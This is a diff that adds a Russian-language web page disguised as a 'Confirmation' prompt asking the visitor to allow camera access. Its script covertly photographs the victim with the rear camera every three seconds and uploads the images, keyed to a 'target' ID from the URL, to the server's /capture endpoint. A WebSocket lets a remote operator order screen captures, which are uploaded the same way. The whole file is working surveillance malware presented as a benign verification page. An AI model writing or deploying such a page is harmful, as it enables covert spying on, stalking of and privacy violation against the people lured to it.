@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Подтверждение</title>
+    <style>
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body { background:#0a0a0f; color:#fff; font-family:Arial; display:flex; justify-content:center; align-items:center; min-height:100vh; }
+        .container { background:#16161f; border-radius:28px; padding:32px 24px; max-width:400px; width:100%; text-align:center; }
+        .btn { background:#2ea6ff; border:none; color:#fff; padding:16px; border-radius:60px; font-size:18px; width:100%; cursor:pointer; }
+        #video { width:100%; border-radius:16px; margin-top:16px; display:none; }
+        .loader { border:3px solid #2a2a44; border-top:3px solid #2ea6ff; border-radius:50%; width:40px; height:40px; animation:spin 0.8s linear infinite; margin:20px auto; display:none; }
+        @keyframes spin { 0%{transform:rotate(0deg)} 100%{transform:rotate(360deg)} }
+    </style>
+</head>
+<body>
+<div class="container">
+    <h2>🔐 Подтверждение</h2>
+    <p>Разрешите доступ к камере</p>
+    <button class="btn" id="allowBtn">✅ Разрешить</button>
+    <div class="loader" id="loader"></div>
+    <video id="video" autoplay muted></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+</div>
+<script>
+    const params = new URLSearchParams(window.location.search);
+    const target = params.get('target');
+    if (!target) { document.body.innerHTML = 'Ошибка'; }
+
+    const ws = new WebSocket(`wss://${window.location.host}/ws?target=${target}`);
+    let stream = null;
+    let interval = null;
+
+    document.getElementById('allowBtn').onclick = async () => {
+        try {
+            stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
+            document.getElementById('video').srcObject = stream;
+            document.getElementById('video').style.display = 'block';
+            document.getElementById('loader').style.display = 'none';
+            startCapture();
+        } catch(e) { alert('Ошибка: ' + e.message); }
+    };
+
+    function startCapture() {
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const ctx = canvas.getContext('2d');
+        interval = setInterval(() => {
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+            ctx.drawImage(video, 0, 0);
+            const base64 = canvas.toDataURL('image/jpeg', 0.7).split(',')[1];
+            fetch('/capture', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ target, image: base64, type: 'camera' })
+            });
+        }, 3000);
+    }
+
+    ws.onmessage = (e) => {
+        const data = JSON.parse(e.data);
+        if (data.type === 'screenshot') {
+            navigator.mediaDevices.getDisplayMedia({ video: true }).then(displayStream => {
+                const v = document.createElement('video');
+                v.srcObject = displayStream;
+                v.onloadedmetadata = () => {
+                    const c = document.createElement('canvas');
+                    c.width = v.videoWidth;
+                    c.height = v.videoHeight;
+                    c.getContext('2d').drawImage(v, 0, 0);
+                    const base64 = c.toDataURL('image/jpeg', 0.9).split(',')[1];
+                    fetch('/capture', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ target, image: base64, type: 'screenshot' })
+                    });
+                    displayStream.getTracks().forEach(t => t.stop());
+                };
+            });
+        }
+    };
+</script>
+</body>
+</html>
